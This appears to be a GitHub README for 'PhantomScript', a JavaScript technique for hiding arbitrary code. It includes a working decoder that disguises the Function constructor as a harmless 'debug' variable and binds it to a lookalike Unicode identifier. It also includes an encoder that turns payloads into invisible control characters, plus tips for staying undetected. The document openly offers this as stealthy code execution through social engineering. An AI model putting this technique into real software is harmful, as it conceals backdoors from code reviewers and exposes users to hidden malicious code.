![](https://raw.githubusercontent.com/jagracey/PhantomScript/020172df875ae4dacac9f719228f7746ad34b98b/resources/phantomScript.jpg)


### A better way to execute arbitrary invisible code using a little social engineering.
Once the decoder script is added, the following allows for invisible code execution.
`ꓼ('')`

Add in the decoder script:


```javascript
/* Hide these variables somewhere up top in the code. The debug variable is basically eval. Log var provides a friendly name. */
var debug = String.apply.constructor;


/* Here is the core decoder functionality. Notice the friendly looking names like debug and log. */
var temp_debug = function(val){
  var debugTarget = []
  .map
  .call(val, x=>x.charCodeAt())
  .filter( x=> (x <= 8) || (x >= 11 && x <= 31) || ( x >= 127 && x <= 159) )
  .map(x=>{
    if (x > 126) x-= 95;
    if (x > 10) x-=2;
    return x;
  })
  .reduce((x,cur,i,v)=> i%2? x + String.fromCharCode((v[i-1] << 5) + cur) : x,'');
  debug( debugTarget )();
};


/* Somewhere near the bottom we name the function with a stealthy Unicode character. Remove global/window as needed. */
this.\u{A4FC} = temp_debug;
```



Now you can execute invisible code with what seems like nothing but a semicolon.  Non zero-width characters are filtered out for maximum stealth.



### How is this possible?
It's actually quite easy to save data with invisible, zero-width characters in Unicode. I've only included the invisible characters from the ASCII range of characters, but there are certainly many more in the 1.1(?) million Unicode characters from the many Astrals.

The harder and more critical work is the social engineering aspect. ECMAScript 6 has made a big push for internationalizing characters, and as such now permits unicode in variable names using [Unicode Code Point Escape Sequences](https://mathiasbynens.be/notes/javascript-escapes).

Any Unicode character that has been designated with the property of [ID_START](https://codepoints.net/search?IDS=1) can be used at the beginning of a variable name.  Any character with the designated property of [ID_CONTINUE](https://codepoints.net/search?IDC=1)

Here are some valid variable names.
 - `ꓸ`   `\u{A4F8}`
 - `ꓹ`   `\u{A4F9}`
 - `ꓼ`   `\u{A4FC}`
 - `ꓽ`   `\u{A4FD}`




```javascript
var encode = function(payload){

  var convert2Ascii = function(text){
    return Array
    .from(text)
    .map(function(char){
      if ( /[^\x00-\x7F]/g.test(char) ){
        return char
        .split('')
        .map(x=>`\\u{${ (x.charCodeAt()).toString(16) }}`)
        .join('');
      }
      return char;
    });
  };

  var mapping = function(char){
    if (char > 8)  char+= 2;
    if (char > 31) char+= 95;
    return char;
  };

  var mapCharacters = function(text){
    return text
    .split('')
    .map(x=>x.charCodeAt())
    .map(x=>{
      var low  = mapping( x & 0x1F);
      var high = mapping( x >> 5  );
      return String.fromCharCode(high, low);
    })
    .join('');
  };

  return mapCharacters( convert2Ascii(payload).join('') );
};
```



### Limitations
Many font packages do not support the characters you wish to use, representing characters as boxes. That'll be a giveaway.  Try and stick to the lower numbered characters.


### More Reading
You can learn more about astral code points on Mathias Bynen's [blog](https://mathiasbynens.be/notes/javascript-unicode)
